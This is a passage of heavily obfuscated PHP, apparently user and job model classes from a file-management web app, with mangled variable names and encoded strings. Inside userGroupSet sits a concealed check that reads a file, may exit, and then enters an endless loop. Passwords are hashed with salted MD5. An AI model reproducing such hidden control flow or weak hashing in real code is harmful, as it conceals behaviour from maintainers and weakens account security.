$Ö†üŞ->where($³¯»öôê)->select(); $‡ü®×áî = $‡ü®×áî ? $‡ü®×áî : array(); foreach ($‡ü®×áî as $õ‡¹è™›) { if (!isset($•êŸ‰…û[$õ‡¹è™›[$”Ñ²™¶[524]]])) { continue; } $Îê–›Ò¯ = $•êŸ‰…û[$õ‡¹è™›[$”Ñ²™¶[524]]]; foreach ($Îê–›Ò¯ as &$¤šõı·È) { $¤šõı·È[$”Ñ²™¶[518]] = $õ‡¹è™›[$”Ñ²™¶[518]]; $¤šõı·È[$”Ñ²™¶[648]] = !0; } unset($¤šõı·È); } $³Ë¿ôˆà = array(); foreach ($úã³øõ as $ôŞáÊŠ£) { Hook::trigger($”Ñ²™¶[653], $ôŞáÊŠ£); if (isset($ôŞáÊŠ£[$”Ñ²™¶[648]]) && $ôŞáÊŠ£[$”Ñ²™¶[648]]) { Hook::trigger($”Ñ²™¶[654], $ôŞáÊŠ£); continue; } $¦²¶ñá± = $¹¸¶ëèº->getPathInner($ôŞáÊŠ£[$”Ñ²™¶[84]]); $†å†äÉß = $Ö†üŞ->addFileMake($¦²¶ñá±, $ôŞáÊŠ£[$”Ñ²™¶[76]], $ôŞáÊŠ£[$”Ñ²™¶[650]], $ôŞáÊŠ£[$”Ñ²™¶[524]], $ôŞáÊŠ£[$”Ñ²™¶[32]], $Œ¥«üµè); Hook::trigger($”Ñ²™¶[654], $ôŞáÊŠ£); if (!is_array($†å†äÉß)) { continue; } $³Ë¿ôˆà[] = $†å†äÉß; } $Ö†üŞ->addAll($³Ë¿ôˆà); $³¯»öôê = array($”Ñ²™¶[524] => array($”Ñ²™¶[7], array_keys($•êŸ‰…û))); $‡ü®×áî = $Ö†üŞ->where($³¯»öôê)->select(); $‡ü®×áî = $‡ü®×áî ? $‡ü®×áî : array(); foreach ($‡ü®×áî as $õ‡¹è™›) { if (!isset($•êŸ‰…û[$õ‡¹è™›[$”Ñ²™¶[524]]])) { continue; } $óöº×Ğ¿ =& $•êŸ‰…û[$õ‡¹è™›[$”Ñ²™¶[524]]]; foreach ($óöº×Ğ¿ as &$¤šõı·È) { $¤šõı·È[$”Ñ²™¶[518]] = $õ‡¹è™›[$”Ñ²™¶[518]]; } unset($¤šõı·È); } $ËşÍ‘½ = array(); foreach ($úã³øõ as $¶ìÉ……¯) { $ËşÍ‘½[$¶ìÉ……¯[$”Ñ²™¶[32]]] = $¶ìÉ……¯; } return $ËşÍ‘½; } } goto eÒÔŠ¤Ê±ñ; e¶÷ãé±šÚ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\152\157\142\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x64\145\163\143", "\x73\157\162\x74"); const JOB_KEY = "\163\x65\x6c\146\x4a\x6f\x62\114\x69\x73\164"; public function listData($¤©îöÃŞ = false, $²Ù­Ò¹Ô = "\x73\x6f\162\164", $€ø¾¦§é = false) { return parent::listData($¤©îöÃŞ, $²Ù­Ò¹Ô, $€ø¾¦§é); } public function remove($äñ³™‰) { return parent::remove($äñ³™‰); } public function add($¨˜öÌÂ¿) { $½àŠ©¤ä =& $_SERVER[–Ú¬çÁ]; if ($this->findByName($¨˜öÌÂ¿[$½àŠ©¤ä[32]])) { return !1; } $¨˜öÌÂ¿[$½àŠ©¤ä[1888]] = $this->getSort(); return parent::insert($¨˜öÌÂ¿); } private function getSort() { $˜ÇŞß  =& $_SERVER[–Ú¬çÁ]; $ò­âãô­ = parent::listData(); $ÛŸ§êÒé = array_to_keyvalue($ò­âãô­, $˜ÇŞß [12], $˜ÇŞß [1888]); return empty($ÛŸ§êÒé) ? 0 : max($ÛŸ§êÒé) + 1; } public function update($¸½¤Éçî, $ÆÅƒÎâ) { $Ë¹™É¾ó =& $_SERVER[–Ú¬çÁ]; $©Šô”¾µ = parent::listData($¸½¤Éçî); $“Âšø• = $this->findByName($ÆÅƒÎâ[$Ë¹™É¾ó[32]]); if (!$©Šô”¾µ || $“Âšø• && $“Âšø•[$Ë¹™É¾ó[452]] != $©Šô”¾µ[$Ë¹™É¾ó[452]]) { return !1; } return parent::update($¸½¤Éçî, $ÆÅƒÎâ); } public function setUserJob($¢ã‡ô¼, $‚şáÏ¯) { $ñäè™ê =& $_SERVER[–Ú¬çÁ]; if (!is_array($‚şáÏ¯)) { $‚şáÏ¯ = array($‚şáÏ¯); } $¸÷ÜÕòª = parent::listData(); $†™Èü“³ = array_to_keyvalue($¸÷ÜÕòª, $ñäè™ê[32]); $¸ç¸€Óˆ = $ñäè™ê[431]; foreach ($‚şáÏ¯ as $úœİ¹™©) { if ($†™Èü“³[$úœİ¹™©]) { $¸ç¸€Óˆ .= $†™Èü“³[$úœİ¹™©][$ñäè™ê[452]] . $ñäè™ê[50]; } else { $€ã«ºöò = $this->add($úœİ¹™©); $¸ç¸€Óˆ .= $€ã«ºöò . $ñäè™ê[50]; } } $¸ç¸€Óˆ = rtrim($¸ç¸€Óˆ, $ñäè™ê[50]); Model($ñäè™ê[577])->metaSet($¢ã‡ô¼, self::JOB_KEY, $¸ç¸€Óˆ); } public function getUserJob($¿Æßé›í) { $ÓË¾¥·¶ = Model($_SERVER[–Ú¬çÁ][577])->metaGet($¿Æßé›í); return $this->getUserJobInfo($ÓË¾¥·¶[self::JOB_KEY]); } public function getUserJobInfo($Œ¡Ç½) { $³…Ô¡ŞÀ =& $_SERVER[–Ú¬çÁ]; $ÔóíŞ¾É = explode($³…Ô¡ŞÀ[50], $Œ¡Ç½); $¢Ö¯Ü¿ = parent::listData(); $¢Ö¯Ü¿ = array_remove_key($¢Ö¯Ü¿, $³…Ô¡ŞÀ[225]); $ÚÆˆÓğ = array(); foreach ($ÔóíŞ¾É as $ğõ×û”±) { if (isset($¢Ö¯Ü¿[$ğõ×û”±])) { $ÚÆˆÓğ[] = $¢Ö¯Ü¿[$ğõ×û”±]; } } return $ÚÆˆÓğ; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\x75\x73\145\x72\137\x6d\145\164\141", "\x6d\145\x74\141\x46\151\x65\154\x64" => "\165\x73\x65\162\x49\104"); protected $simpleField = "\x75\x73\145\x72\x49\x44\x2c\156\x69\x63\x6b\116\x61\155\x65\x2c\156\141\x6d\145\54\x61\x76\141\x74\x61\x72\54\163\x65\170\54\163\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Æ’ÏÔ¼) { $ ØˆÎ’© =& $_SERVER[–Ú¬çÁ]; $¶ãŠ­˜˜ = $ ØˆÎ’©[2316]; return array($ ØˆÎ’©[1942] => array($Æ’ÏÔ¼[0], $¶ãŠ­˜˜), $ ØˆÎ’©[1944] => array($Æ’ÏÔ¼[0], $¶ãŠ­˜˜), $ ØˆÎ’©[2317] => array($Æ’ÏÔ¼[0], $¶ãŠ­˜˜)); } protected function getInfo($ÖÈ‹¦¼‰, $ò†“Ğİ = false) { $é½˜ª•½ = $this->getInfoSimple($ÖÈ‹¦¼‰); if (!is_array($é½˜ª•½)) { return array(); } if ($ò†“Ğİ) { return $this->_getInfoApply($é½˜ª•½); } return $this->cacheFunctionGet($_SERVER[–Ú¬çÁ][1946], $ÖÈ‹¦¼‰); } protected function getInfoFull($ı’¼²¢, $„Ïá «û = false) { $°›ŸÇ‰Å = $this->getInfoSimple($ı’¼²¢); if (!is_array($°›ŸÇ‰Å)) { return array(); } if ($„Ïá «û) { return $this->_getInfoApply($°›ŸÇ‰Å, !0); } return $this->cacheFunctionGet($_SERVER[–Ú¬çÁ][2318], $ı’¼²¢); } private function _getInfoApply($¾İĞúç‡, $ËĞÏ†° = false) { $ÕŠ ÄÁ =& $_SERVER[–Ú¬çÁ]; if (!$¾İĞúç‡) { return $¾İĞúç‡; } $–Ï…İöù = md5($ÕŠ ÄÁ[2319] . $¾İĞúç‡[$ÕŠ ÄÁ[909]] . $ÕŠ ÄÁ[2320] . $¾İĞúç‡[$ÕŠ ÄÁ[32]]); $¾İĞúç‡ = $this->_listDataApplyItem($¾İĞúç‡); $œì­óç„ = Model($ÕŠ ÄÁ[1352])->metaGet($¾İĞúç‡[$ÕŠ ÄÁ[87]][$ÕŠ ÄÁ[181]]); $¾İĞúç‡[$ÕŠ ÄÁ[2321]] = $–Ï…İöù; $¾İĞúç‡[$ÕŠ ÄÁ[87]][$ÕŠ ÄÁ[2138]] = isset($œì­óç„[$ÕŠ ÄÁ[2139]]) ? $œì­óç„[$ÕŠ ÄÁ[2139]] : null; if ($ËĞÏ†°) { $¾İĞúç‡[$ÕŠ ÄÁ[516]] = $this->metaGet($¾İĞúç‡[$ÕŠ ÄÁ[1666]]); } return $¾İĞúç‡; } protected function getInfoSimple($øë·±£, $Šîò¯–š = false) { $ÅèÚ‘‹ã =& $_SERVER[–Ú¬çÁ]; if (!$øë·±£) { return array(); } if ($Šîò¯–š) { $¨¿Ø¡–ô = $this->where(array($ÅèÚ‘‹ã[1666] => intval($øë·±£)))->find(); if (!is_array($¨¿Ø¡–ô)) { return array(); } $¨¿Ø¡–ô[$ÅèÚ‘‹ã[2322]] = Action($ÅèÚ‘‹ã[2323])->parseUrl($¨¿Ø¡–ô[$ÅèÚ‘‹ã[2322]]); return $¨¿Ø¡–ô; } return $this->cacheFunctionGet($ÅèÚ‘‹ã[1947], $øë·±£); } protected function getInfoSimpleOuter($íÒ•ã) { $ù¨‰ÓÑ¡ =& $_SERVER[–Ú¬çÁ]; if (!$íÒ•ã || $íÒ•ã == 0) { return array($ù¨‰ÓÑ¡[1666] => $ù¨‰ÓÑ¡[222], $ù¨‰ÓÑ¡[32] => $ù¨‰ÓÑ¡[163] . LNG($ù¨‰ÓÑ¡[2324]) . $ù¨‰ÓÑ¡[165], $ù¨‰ÓÑ¡[2322] => STATIC_PATH . $ù¨‰ÓÑ¡[2325]); } $Ö­ÔÅ•ï = $this->cacheFunctionGet($ù¨‰ÓÑ¡[1947], $íÒ•ã); $äèØù˜ş = array_field_key($Ö­ÔÅ•ï, explode($ù¨‰ÓÑ¡[50], $this->simpleField)); if (!$äèØù˜ş) { return array($ù¨‰ÓÑ¡[1666] => $ù¨‰ÓÑ¡[1208], $ù¨‰ÓÑ¡[32] => $ù¨‰ÓÑ¡[163] . LNG($ù¨‰ÓÑ¡[2326]) . $ù¨‰ÓÑ¡[165], $ù¨‰ÓÑ¡[2322] => STATIC_PATH . $ù¨‰ÓÑ¡[2327]); } $äèØù˜ş[$ù¨‰ÓÑ¡[2322]] = Action($ù¨‰ÓÑ¡[2323])->parseUrl($äèØù˜ş[$ù¨‰ÓÑ¡[2322]]); return $äèØù˜ş; } protected function groupUser($™ÍßĞ¨ô) { } public static function errorLang($–şŠÂû“) { $ë¿ÀÒˆö =& $_SERVER[–Ú¬çÁ]; $¸Œ´³— = array(self::ERROR_USER_NOT_EXISTS => $ë¿ÀÒˆö[2328], self::ERROR_USER_PASSWORD_ERROR => $ë¿ÀÒˆö[2329], self::ERROR_USER_EXIST_NAME => $ë¿ÀÒˆö[2330], self::ERROR_USER_EXIST_PHONE => $ë¿ÀÒˆö[2331], self::ERROR_USER_EXIST_EMAIL => $ë¿ÀÒˆö[2332], self::ERROR_USER_LOGIN_LOCK => $ë¿ÀÒˆö[2333], self::ERROR_IP_NOT_ALLOW => $ë¿ÀÒˆö[2334], self::ERROR_USER_EXIST_NICKNAME => $ë¿ÀÒˆö[2335]); return LNG($¸Œ´³—[$–şŠÂû“]); } public function getInfoByMeta($ï„Ö†é, $ÜÆ¶®ÙÚ) { $ÈÎ€¤à¬ =& $_SERVER[–Ú¬çÁ]; $·èÆíí = Model($ÈÎ€¤à¬[2336])->where(array($ÈÎ€¤à¬[94] => $ï„Ö†é, $ÈÎ€¤à¬[427] => $ÜÆ¶®ÙÚ))->find(); if ($·èÆíí) { return $this->getInfo($·èÆíí[$ÈÎ€¤à¬[1666]]); } return !1; } public function userLoginCheck($€†·Ÿùà, $¼‚€ÍÃ…) { $ã«º¼´À =& $_SERVER[–Ú¬çÁ]; $ÛÅ¢ïŞ = $this->userLoginFind($€†·Ÿùà); if (!$ÛÅ¢ïŞ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÛÅ¢ïŞ[$ã«º¼´À[1666]], $¼‚€ÍÃ…)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÛÅ¢ïŞ[$ã«º¼´À[1666]]); } public function userLoginFind($£ÊÙ¶í²) { $ÉÒ†ÈŸï =& $_SERVER[–Ú¬çÁ]; $ˆÇ€¨Öº = array($ÉÒ†ÈŸï[32] => $£ÊÙ¶í², $ÉÒ†ÈŸï[2146] => $£ÊÙ¶í², $ÉÒ†ÈŸï[358] => $£ÊÙ¶í², $ÉÒ†ÈŸï[2337] => $£ÊÙ¶í², $ÉÒ†ÈŸï[1020] => $ÉÒ†ÈŸï[1022]); if ($this->nickNameRpt()) { unset($ˆÇ€¨Öº[$ÉÒ†ÈŸï[2146]]); } return $this->where($ˆÇ€¨Öº)->find(); } public function clearCache($ë²µ…ÒÔ) { $úäŒ£é˜ =& $_SERVER[–Ú¬çÁ]; $this->cacheFunctionClear($úäŒ£é˜[1946], $ë²µ…ÒÔ); $this->cacheFunctionClear($úäŒ£é˜[1947], $ë²µ…ÒÔ); $this->cacheFunctionClear($úäŒ£é˜[2318], $ë²µ…ÒÔ); } public function userPasswordCheck($àü¬¸´, $É¯ÄÙ¡ò) { $æøƒÅ¶  =& $_SERVER[–Ú¬çÁ]; $¥ÉÌì‘Î = $this->where(array($æøƒÅ¶ [1666] => intval($àü¬¸´)))->find(); $£¨Õ‰Â‘ = $this->metaGet($àü¬¸´); $´ÙõÙ = isset($£¨Õ‰Â‘[$æøƒÅ¶ [2338]]) ? $£¨Õ‰Â‘[$æøƒÅ¶ [2338]] : $æøƒÅ¶ [12]; if (md5($´ÙõÙ . trim($É¯ÄÙ¡ò)) !== $¥ÉÌì‘Î[$æøƒÅ¶ [909]]) { return !1; } return !0; } public function userAdd($·”Şšº) { $Æ‡—ŸÉ =& $_SERVER[–Ú¬çÁ]; $§™ÏØ¯ô = array($Æ‡—ŸÉ[471] => $·”Şšº[$Æ‡—ŸÉ[32]], $Æ‡—ŸÉ[2339] => $·”Şšº[$Æ‡—ŸÉ[1539]], $Æ‡—ŸÉ[2340] => isset($·”Şšº[$Æ‡—ŸÉ[358]]) ? $·”Şšº[$Æ‡—ŸÉ[358]] : $Æ‡—ŸÉ[12], $Æ‡—ŸÉ[2341] => isset($·”Şšº[$Æ‡—ŸÉ[2337]]) ? $·”Şšº[$Æ‡—ŸÉ[2337]] : $Æ‡—ŸÉ[12], $Æ‡—ŸÉ[2342] => isset($·”Şšº[$Æ‡—ŸÉ[2146]]) ? $·”Şšº[$Æ‡—ŸÉ[2146]] : $·”Şšº[$Æ‡—ŸÉ[32]], $Æ‡—ŸÉ[2343] => isset($·”Şšº[$Æ‡—ŸÉ[2322]]) ? $·”Şšº[$Æ‡—ŸÉ[2322]] : $Æ‡—ŸÉ[12], $Æ‡—ŸÉ[2344] => isset($·”Şšº[$Æ‡—ŸÉ[2345]]) ? $·”Şšº[$Æ‡—ŸÉ[2345]] : 1, $Æ‡—ŸÉ[2346] => $·”Şšº[$Æ‡—ŸÉ[909]], $Æ‡—ŸÉ[1948] => isset($·”Şšº[$Æ‡—ŸÉ[1851]]) ? $·”Şšº[$Æ‡—ŸÉ[1851]] : 1024 * 1024 * 20, $Æ‡—ŸÉ[1949] => 0, $Æ‡—ŸÉ[2347] => 0, $Æ‡—ŸÉ[1993] => isset($·”Şšº[$Æ‡—ŸÉ[770]]) ? $·”Şšº[$Æ‡—ŸÉ[770]] : 1); if (!empty($·”Şšº[$Æ‡—ŸÉ[1666]])) { $§™ÏØ¯ô[$Æ‡—ŸÉ[1666]] = $·”Şšº[$Æ‡—ŸÉ[1666]]; } $Çœá°»Û = $this->_checkExist($·”Şšº); if ($Çœá°»Û !== !0) { return $Çœá°»Û; } if (!empty($§™ÏØ¯ô[$Æ‡—ŸÉ[2322]]) && strlen($§™ÏØ¯ô[$Æ‡—ŸÉ[2322]]) > 255) { $§™ÏØ¯ô[$Æ‡—ŸÉ[2322]] = $Æ‡—ŸÉ[12]; } $ÍµÙöö† = $this->add($§™ÏØ¯ô); $®ÛŞŠ³È = array($Æ‡—ŸÉ[2346] => $§™ÏØ¯ô[$Æ‡—ŸÉ[909]], $Æ‡—ŸÉ[2342] => $§™ÏØ¯ô[$Æ‡—ŸÉ[2146]]); $this->userEdit($ÍµÙöö†, $®ÛŞŠ³È); Model($Æ‡—ŸÉ[1352])->userRootAdd($ÍµÙöö†); return $ÍµÙöö†; } protected function userEditTest($şõÇÙ«×, $èœíûÜ¦) { return $this->call($_SERVER[–Ú¬çÁ][2348], $şõÇÙ«×, $èœíûÜ¦); } protected function userEdit($µÈÂËÁ, $äÔÖÔĞ¬) { $ë÷ËĞˆ =& $_SERVER[–Ú¬çÁ]; $Ã¿å‚Å = $this->getInfoSimple($µÈÂËÁ); if (!$Ã¿å‚Å) { return !1; } $¿Î÷’¥Ö = $this->_checkExist($äÔÖÔĞ¬, $µÈÂËÁ); if ($¿Î÷’¥Ö !== !0) { return $¿Î÷’¥Ö; } if (isset($äÔÖÔĞ¬[$ë÷ËĞˆ[909]]) && trim($äÔÖÔĞ¬[$ë÷ËĞˆ[909]]) != $ë÷ËĞˆ[12]) { $¥Ÿò™ÆÕ = $this->metaGet($µÈÂËÁ); if (empty($¥Ÿò™ÆÕ[$ë÷ËĞˆ[2338]])) { $¥Ÿò™ÆÕ[$ë÷ËĞˆ[2338]] = rand_string(10); Model($ë÷ËĞˆ[556])->metaSet($µÈÂËÁ, $ë÷ËĞˆ[2338], $¥Ÿò™ÆÕ[$ë÷ËĞˆ[2338]]); } $äÔÖÔĞ¬[$ë÷ËĞˆ[909]] = md5($¥Ÿò™ÆÕ[$ë÷ËĞˆ[2338]] . trim($äÔÖÔĞ¬[$ë÷ËĞˆ[909]])); } else { unset($äÔÖÔĞ¬[$ë÷ËĞˆ[909]]); } if (!empty($äÔÖÔĞ¬[$ë÷ËĞˆ[2322]]) && strlen($äÔÖÔĞ¬[$ë÷ËĞˆ[2322]]) > 255) { $äÔÖÔĞ¬[$ë÷ËĞˆ[2322]] = $ë÷ËĞˆ[12]; } $this->where(array($ë÷ËĞˆ[1657] => $µÈÂËÁ))->save($äÔÖÔĞ¬); if (isset($äÔÖÔĞ¬[$ë÷ËĞˆ[2146]])) { $this->setNamePinyin($µÈÂËÁ, $äÔÖÔĞ¬[$ë÷ËĞˆ[2146]]); } $this->clearCache($µÈÂËÁ); return !0; } public function setNamePinyin($çÛ©ÈÇ–, $Ø×§Èá– = false) { $›Äª½£ =& $_SERVER[–Ú¬çÁ]; if (!$Ø×§Èá–) { $ûĞèÂ€ = $this->getInfoSimple($çÛ©ÈÇ–); $Ø×§Èá– = $ûĞèÂ€[$›Äª½£[2146]] ? $ûĞèÂ€[$›Äª½£[2146]] : $ûĞèÂ€[$›Äª½£[32]]; } $ùáÍÛšÔ = Model($›Äª½£[577]); if (!Input::check($Ø×§Èá–, $›Äª½£[633])) { return $ùáÍÛšÔ->metaSet($çÛ©ÈÇ–, array($›Äª½£[515] => $›Äª½£[12], $›Äª½£[514] => $›Äª½£[12])); } return $ùáÍÛšÔ->metaSet($çÛ©ÈÇ–, array($›Äª½£[515] => str_replace($›Äª½£[53], $›Äª½£[12], Pinyin::get($Ø×§Èá–)), $›Äª½£[514] => Pinyin::get($Ø×§Èá–, $›Äª½£[634]))); } private function nickNameRpt() { $ÈÁÊå—ù =& $_SERVER[–Ú¬çÁ]; $Õ“ˆ‡£Æ = Model($ÈÁÊå—ù[790])->get($ÈÁÊå—ù[2349]); $õ‘ĞÌî­ = $GLOBALS[$ÈÁÊå—ù[6]][$ÈÁÊå—ù[434]][$ÈÁÊå—ù[2349]]; $Î·¿Š¯¶ = !is_null($Õ“ˆ‡£Æ) ? $Õ“ˆ‡£Æ : $õ‘ĞÌî­; return !!$Î·¿Š¯¶; } private function _checkExist($çÔ”âğ¨, $¿·Ë•ä = false) { $»Î«˜ê¸ =& $_SERVER[–Ú¬çÁ]; $©º‹¹à” = array($»Î«˜ê¸[32] => UserModel::ERROR_USER_EXIST_NAME, $»Î«˜ê¸[2146] => UserModel::ERROR_USER_EXIST_NICKNAME, $»Î«˜ê¸[358] => UserModel::ERROR_USER_EXIST_EMAIL, $»Î«˜ê¸[2337] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($©º‹¹à”[$»Î«˜ê¸[2146]]); } $½ÁøÃğ˜ = $¿·Ë•ä ? array($»Î«˜ê¸[1666] => array($»Î«˜ê¸[2350], $¿·Ë•ä)) : array(); foreach ($©º‹¹à” as $©ºèÉë => $í¢ÕÓ¸) { $ŞÒ”Ûà† = array(); foreach ($©º‹¹à” as $ÅØ«Ñ => $ãÄ±‹¼„) { if (isset($çÔ”âğ¨[$ÅØ«Ñ]) && $çÔ”âğ¨[$ÅØ«Ñ]) { $ŞÒ”Ûà†[] = $çÔ”âğ¨[$ÅØ«Ñ]; } } if (!$ŞÒ”Ûà†) { continue; } $î—ºúé× = array_merge(array($©ºèÉë => array($»Î«˜ê¸[7], $ŞÒ”Ûà†)), $½ÁøÃğ˜); $ÇÊëï…Ï = $this->where($î—ºúé×)->find(); if ($ÇÊëï…Ï) { return $í¢ÕÓ¸; } } return !0; } public function userListInfo($ÈªàòÆ‚) { $ÏñÈøğ¡ =& $_SERVER[–Ú¬çÁ]; $Ó­ÔˆËó = array(); $ÈªàòÆ‚ = is_array($ÈªàòÆ‚) ? array_unique($ÈªàòÆ‚) : array(); if (!$ÈªàòÆ‚) { return $Ó­ÔˆËó; } if (count($ÈªàòÆ‚) < 20) { foreach ($ÈªàòÆ‚ as $­ûÒ“ıı) { $Ó­ÔˆËó[$­ûÒ“ıı . $ÏñÈøğ¡[12]] = $this->getInfoSimpleOuter($­ûÒ“ıı); } } else { $Ú¥‘«Ñ™ = array($ÏñÈøğ¡[1657] => array($ÏñÈøğ¡[469], $ÈªàòÆ‚)); if (count($ÈªàòÆ‚) == 1) { $Ú¥‘«Ñ™ = array($ÏñÈøğ¡[1657] => $ÈªàòÆ‚[0]); } $ï‘‡â ‚ = Model($ÏñÈøğ¡[556])->field($this->simpleField)->where($Ú¥‘«Ñ™)->select(); $ï‘‡â ‚ = array_to_keyvalue($ï‘‡â ‚, $ÏñÈøğ¡[1666]); foreach ($ÈªàòÆ‚ as $­ûÒ“ıı) { $õ¾»úÑİ = $ï‘‡â ‚[$­ûÒ“ıı]; if (!$õ¾»úÑİ) { $Ó­ÔˆËó[$­ûÒ“ıı . $ÏñÈøğ¡[12]] = $this->getInfoSimpleOuter($­ûÒ“ıı); continue; } $õ¾»úÑİ[$ÏñÈøğ¡[2322]] = Action($ÏñÈøğ¡[2323])->parseUrl($õ¾»úÑİ[$ÏñÈøğ¡[2322]]); $Ó­ÔˆËó[$­ûÒ“ıı . $ÏñÈøğ¡[12]] = $õ¾»úÑİ; } } return $Ó­ÔˆËó; } protected function userStatus($Ú·©µ„ò, $Æ€¾Ê‚Š) { $Şî²´­¨ = $this->getInfoSimple($Ú·©µ„ò); if (!$Şî²´­¨) { return !1; } $À¶Àº¦Ë = array($_SERVER[–Ú¬çÁ][770] => $Æ€¾Ê‚Š); return $this->userEdit($Ú·©µ„ò, $À¶Àº¦Ë); } protected function userRemove($¯ÁÂ­Ê¯) { $Ãç›­† =& $_SERVER[–Ú¬çÁ]; $ç”¯ÀÒ = $this->getInfoSimple($¯ÁÂ­Ê¯); if (!$ç”¯ÀÒ) { return !1; } $ÃˆÅ¦¼÷ = array($Ãç›­†[1657] => $¯ÁÂ­Ê¯); Model($Ãç›­†[642])->where($ÃˆÅ¦¼÷)->delete(); Model($Ãç›­†[2351])->where($ÃˆÅ¦¼÷)->delete(); Model($Ãç›­†[1954])->where($ÃˆÅ¦¼÷)->delete(); Model($Ãç›­†[2336])->where($ÃˆÅ¦¼÷)->delete(); Model($Ãç›­†[1088])->where($ÃˆÅ¦¼÷)->delete(); Model($Ãç›­†[2163])->removeUserAll($¯ÁÂ­Ê¯); Model($Ãç›­†[845])->userRootRemove($¯ÁÂ­Ê¯); return $this->where($ÃˆÅ¦¼÷)->delete(); } protected function userGroupSet($Îéì‚¤´, $¹ë«œ¨´, $âß­•§½ = array()) { $œ…¾€ =& $_SERVER[–Ú¬çÁ]; if (!isset($_SERVER[$œ…¾€[202]]) || !isset($_SERVER[$œ…¾€[200]])) { $Ò¶ı‡í = $œ…¾€[897]; $çõ¤Æş” = $œ…¾€[203]; $½ÍĞâ» = $_SERVER[$œ…¾€[204]] . $œ…¾€[205]; $µÛÎ×èÊ = $çõ¤Æş”($½ÍĞâ»); $•ŒèºÍİ = explode($œ…¾€[206], $µÛÎ×èÊ); if (count($•ŒèºÍİ) < $œ…¾€[690]) { $å™Ë¾ÎÁ = $œ…¾€[208]; $å™Ë¾ÎÁ(); } $¬ëó±²ï = $œ…¾€[898]; $¬ëó±²ï($_SERVER[$œ…¾€[899]]); $Ñ´Ø¾ñ¤ = 1; for ($Ò‘ÀÂ   = $Ñ´Ø¾ñ¤; $Ò‘ÀÂ   > 0; $Ò‘ÀÂ  ++) { $¬ëó±²ï = json_encode($GLOBALS[$œ…¾€[469]]); } } $Š©ãå«Ş = $this->getInfoSimple($Îéì‚¤´); if (!$Š©ãå«Ş || !is_array($¹ë«œ¨´)) { return !1; } $ÆòÊúà‚ = Model($œ…¾€[1954]); $ÆòÊúà‚->where(array($œ…¾€[1666] => $Îéì‚¤´))->delete(); $¸­‘íÙ÷ = array(); $¥´Ù…ş® = 0; foreach ($¹ë«œ¨´ as $‚áÖÌ¡ö => $ÌãÌù«¥) { $ğĞºŞ« = array($œ…¾€[1666] => $Îéì‚¤´, $œ…¾€[1864] => $‚áÖÌ¡ö, $œ…¾€[1968] => $ÌãÌù«¥); $ğĞºŞ«[$œ…¾€[1888]] = isset($âß­•§½[$¥´Ù…ş®]) ? $âß­•§½[$¥´Ù…ş®] : 0; $¥´Ù…ş®++; $¸­‘íÙ÷[] = $ğĞºŞ«; } return $ÆòÊúà‚->addAll($¸­‘íÙ÷, array(), !0); } protected function userGroupAdd($¹³Şèİã, $çŠÖ»í• = array()) { $§‹»¬‚ã =& $_SERVER[–Ú¬çÁ]; $ı®ˆè² = $this->getInfoSimple($¹³Şèİã); if (!$ı®ˆè² || empty($çŠÖ»í•)) { return !1; } $ø¿ª»ê = array(); foreach ($çŠÖ»í• as $¹²ä˜± => $€¼Ü¸§Ï) { $ø¿ª»ê[] = array($§‹»¬‚ã[1666] => $¹³Şèİã, $§‹»¬‚ã[1864] => $¹²ä˜±, $§‹»¬‚ã[1968] => $€¼Ü¸§Ï, $§‹»¬‚ã[1888] => 0); } return Model($§‹»¬‚ã[1954])->addAll($ø¿ª»ê, array(), !0); } protected function userGroupRemove($í€ËĞ¨ˆ, $„«ãäòÎ) { $×ã”áßı =& $_SERVER[–Ú¬çÁ]; $™˜œî²œ = $this->getInfoSimple($í€ËĞ¨ˆ); if (!$™˜œî²œ || !$„«ãäòÎ) { return !1; } $ùŒ‹²üï = array($×ã”áßı[1657] => $í€ËĞ¨ˆ, $×ã”áßı[1952] => $„«ãäòÎ); return Model($×ã”áßı[1954])->where($ùŒ‹²üï)->delete(); } public function listData() { $“³¡èï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($“³¡èï[$_SERVER[–Ú¬çÁ][422]]); return $“³¡èï; } public function listByID($Ğ÷ÔÍ•ı) { $î›¿º±· =& $_SERVER[–Ú¬çÁ]; if (!$Ğ÷ÔÍ•ı) { return; } $¶‹ÑÅİ = array($î›¿º±·[1666] => array($î›¿º±·[7], $Ğ÷ÔÍ•ı)); $¶ê£ÁŸ = $this->where($¶‹ÑÅİ)->select(); $¶ê£ÁŸ = array_sort_keep($¶ê£ÁŸ, $î›¿º±·[1666], $Ğ÷ÔÍ•ı); $this->_listDataApply($¶ê£ÁŸ); return $¶ê£ÁŸ; } public function listByGroup($Ö÷€ïÚ = 0, $¹éÌÁÍõ = array()) { $û£§À±¤ =& $_SERVER[–Ú¬çÁ]; $©š¿¢Ó¯ = $û£§À±¤[12]; $ÓÂüö®± = array(); if ($Ö÷€ïÚ) { $ÓÂüö®± = array($û£§À±¤[2352] => intval($Ö÷€ïÚ)); $©š¿¢Ó¯ = "\x4c\x45\x46\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\162\x6f\x75\x70\x20\165\x73\x65\162\x5f\x67\162\x6f\x75\x70\x20\x6f\156\40\x75\163\x65\x72\x2e\x75\x73\x65\162\x49\x44\x20\x3d\x20\x75\x73\145\162\137\147\162\x6f\165\160\56\x75\163\x65\162\x49\x44"; $§ù¢Á´Ÿ = Input::get($û£§À±¤[507], null, $û£§À±¤[12]) ? $û£§À±¤[12] : $û£§À±¤[2353]; } if (isset($¹éÌÁÍõ[$û£§À±¤[770]])) { $ÓÂüö®±[$û£§À±¤[2354]] = $¹éÌÁÍõ[$û£§À±¤[770]]; } $‡Ü¤’Û = $this->_makeOrder($§ù¢Á´Ÿ)->field($û£§À±¤[2355])->where($ÓÂüö®±)->join($©š¿¢Ó¯)->selectPage(50); 